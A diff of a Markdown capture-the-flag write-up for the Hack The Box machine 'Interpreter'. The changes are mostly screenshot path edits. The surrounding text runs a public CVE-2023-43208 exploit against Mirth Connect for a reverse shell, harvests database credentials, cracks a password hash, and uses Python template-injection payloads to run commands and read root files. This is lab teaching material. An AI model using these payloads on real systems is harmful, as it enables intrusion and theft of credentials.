@@ -2,7 +2,7 @@
 
 **Target IP:** `10.129.6.65` 
 **Hostname:** `interpreter.htb` 
-**Platform:** `Linux` 
+**Platform:** `Linux`
 **Difficulty:** `Easy`
 
 ---
@@ -24,7 +24,7 @@ We have two web services (HTTP and HTTPS) and SSH.
 
 Visiting port 80 we see a website hosting NextGen Healthcare by Mirth Connect. There are options to download a launcher and to launch it. On the right there is a login panel which appears to require HTTPS.
 
-![Pasted image 20260224140526.png](Pasted%20image%2020260224140526.png)
+![](Screenshots/Pasted%20image%2020260224140526.png)
 
 Visiting the HTTPS site we can attempt to login.
 
@@ -40,7 +40,7 @@ All results return 200, so we filter by length instead:
 ffuf -c -u http://10.129.6.65 -H "Host: FUZZ.interpreter.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fl 82
 ```
 
-![Pasted image 20260224101843.png](Pasted%20image%2020260224101843.png)
+![](Screenshots/Pasted%20image%2020260224101843.png)
 
 Nothing found.
 
@@ -50,17 +50,17 @@ Directory fuzzing:
 feroxbuster -u http://interpreter.htb
 ```
 
-![Pasted image 20260224101959.png](Pasted%20image%2020260224101959.png)
+![](Screenshots/Pasted%20image%2020260224101959.png)
 
 This finds `/webadmin` and `/installers` which may be interesting. A second scan reveals `/api` but nothing else:
 
-![Pasted image 20260224102501.png](Pasted%20image%2020260224102501.png)
+![](Screenshots/Pasted%20image%2020260224102501.png)
 
 ### Version Detection
 
 A quick search for Mirth Connect reveals several historical exploits, including a notable one referenced by the NHS:
 
-![Pasted image 20260224102140.png](Pasted%20image%2020260224102140.png)
+![](Screenshots/Pasted%20image%2020260224102140.png)
 
 The version can be determined via:
 
@@ -70,7 +70,7 @@ curl -k -H 'X-Requested-With: OpenAPI' https://interpreter.htb:443/api/server/ve
 
 This returns version `4.4.0`:
 
-![Pasted image 20260224103838.png](Pasted%20image%2020260224103838.png)
+![](Screenshots/Pasted%20image%2020260224103838.png)
 
 ---
 
@@ -88,15 +88,15 @@ With a Penelope listener running, we fire off the PoC:
 python3 CVE-2023-43208.py --url 'https://interpreter.htb:443/' --lhost 10.10.15.53 --lport 4444
 ```
 
-![Pasted image 20260224104422.png](Pasted%20image%2020260224104422.png)
+![](Screenshots/Pasted%20image%2020260224104422.png)
 
 We receive a shell, which Penelope auto-upgrades:
 
-![Pasted image 20260224104448.png](Pasted%20image%2020260224104448.png)
+![](Screenshots/Pasted%20image%2020260224104448.png)
 
 We are running as user `mirth`. There is a user `sedric` in `/home` but we do not have access.
 
-![Pasted image 20260224104530.png](Pasted%20image%2020260224104530.png)
+![](Screenshots/Pasted%20image%2020260224104530.png)
 
 ---
 
@@ -121,7 +121,7 @@ keystore.keypass   = tAuJfQeXdnPw
 keystore.type      = JCEKS
 ```
 
-![Pasted image 20260224104720.png](Pasted%20image%2020260224104720.png)
+![](Screenshots/Pasted%20image%2020260224104720.png)
 
 ### Database Enumeration
 
@@ -131,18 +131,18 @@ We connect to the database using the harvested credentials:
 mysql -u mirthdb -p
 ```
 
-![Pasted image 20260224104946.png](Pasted%20image%2020260224104946.png)
+![](Screenshots/Pasted%20image%2020260224104946.png)
 
 ```sql
 USE mc_bdd_prod;
 SHOW TABLES;
 ```
 
-![Pasted image 20260224105058.png](Pasted%20image%2020260224105058.png)
+![](Screenshots/Pasted%20image%2020260224105058.png)
 
 `PERSON_PASSWORD` appears interesting. Querying it reveals a password hash for `PERSON_ID` 2, which cross-references to `sedric` in the `PERSON` table:
 
-![Pasted image 20260224105225.png](Pasted%20image%2020260224105225.png)
+![](Screenshots/Pasted%20image%2020260224105225.png)
 
 ```
 u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
@@ -156,7 +156,7 @@ The hash appears to be base64-encoded. Reviewing the Mirth Connect source code o
 
 The algorithm uses PBKDF2WithHmacSHA256 with 600,000 iterations and an 8-byte salt prepended to the digest:
 
-![Pasted image 20260224114109.png](Pasted%20image%2020260224114109.png) ![Pasted image 20260224114624.png](Pasted%20image%2020260224114624.png) ![Pasted image 20260224114415.png](Pasted%20image%2020260224114415.png) ![Pasted image 20260224115941.png](Pasted%20image%2020260224115941.png)
+![](Screenshots/Pasted%20image%2020260224114109.png) ![](Screenshots/Pasted%20image%2020260224114624.png) ![](Screenshots/Pasted%20image%2020260224114415.png) ![](Screenshots/Pasted%20image%2020260224115941.png)
 
 We can reformat this into a hashcat-compatible mode 10900 string using the following script:
 
@@ -179,7 +179,7 @@ We crack this with hashcat:
 hashcat sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps= /usr/share/wordlists/rockyou.txt
 ```
 
-![Pasted image 20260224131408.png](Pasted%20image%2020260224131408.png)
+![](Screenshots/Pasted%20image%2020260224131408.png)
 
 `sedric`:`snowflake1`
 
@@ -193,11 +193,11 @@ We SSH in with the cracked credentials and grab the user flag:
 ssh sedric@interpreter.htb
 ```
 
-![Pasted image 20260224131514.png](Pasted%20image%2020260224131514.png)
+![](Screenshots/Pasted%20image%2020260224131514.png)
 
 `sudo -l` reveals we cannot run sudo:
 
-![Pasted image 20260224131758.png](Pasted%20image%2020260224131758.png)
+![](Screenshots/Pasted%20image%2020260224131758.png)
 
 ---
 
@@ -211,7 +211,7 @@ Running LinPEAS highlights an internal service on port `54321`. We also identify
 ps -aux
 ```
 
-![Pasted image 20260224133844.png](Pasted%20image%2020260224133844.png)
+![](Screenshots/Pasted%20image%2020260224133844.png)
 
 ### Reviewing the Service
 
@@ -233,7 +233,7 @@ A valid baseline request looks like:
   -d '<?xml version="1.0"?><patient><firstname>John</firstname><lastname>Doe</lastname><sender_app>MirthConnect</sender_app><timestamp>120000</timestamp><birth_date>01/01/1990</birth_date><gender>M</gender></patient>'
 ```
 
-![Pasted image 20260224135559.png](Pasted%20image%2020260224135559.png)
+![](Screenshots/Pasted%20image%2020260224135559.png)
 
 ### Vulnerability Analysis
 
@@ -247,7 +247,7 @@ The `template()` function validates input with a regex, blocking characters such
   -d '<?xml version="1.0"?><patient><firstname>{__import__("os").popen("id").read()}</firstname><lastname>Doe</lastname><sender_app>MirthConnect</sender_app><timestamp>120000</timestamp><birth_date>01/01/1990</birth_date><gender>M</gender></patient>'
 ```
 
-![Pasted image 20260224135643.png](Pasted%20image%2020260224135643.png)
+![](Screenshots/Pasted%20image%2020260224135643.png)
 
 **Reading the root flag directly:**
 
@@ -257,7 +257,7 @@ The `template()` function validates input with a regex, blocking characters such
   -d '<?xml version="1.0"?><patient><firstname>{open("/root/root.txt").read()}</firstname><lastname>Doe</lastname><sender_app>MirthConnect</sender_app><timestamp>120000</timestamp><birth_date>01/01/1990</birth_date><gender>M</gender></patient>'
 ```
 
-![Pasted image 20260224140346.png](Pasted%20image%2020260224140346.png)
+![](Screenshots/Pasted%20image%2020260224140346.png)
 
 ### Building the Final Exploit
 
@@ -280,7 +280,7 @@ chmod +x /tmp/exploit.sh
 
 We receive a root shell on our Penelope listener:
 
-![Pasted image 20260224141940.png](Pasted%20image%2020260224141940.png)
+![](Screenshots/Pasted%20image%2020260224141940.png)
 
 ### Alternative Path (Root Before User)
 
@@ -290,7 +290,7 @@ It is technically possible to perform privilege escalation before cracking the u
 SELECT * FROM CHANNEL;
 ```
 
-![Pasted image 20260224143303.png](Pasted%20image%2020260224143303.png)
+![](Screenshots/Pasted%20image%2020260224143303.png)
 
 This reveals the HL7 and XML templates used by MirthConnect, providing the structure needed to craft a valid request without ever needing `sedric`'s credentials.
 
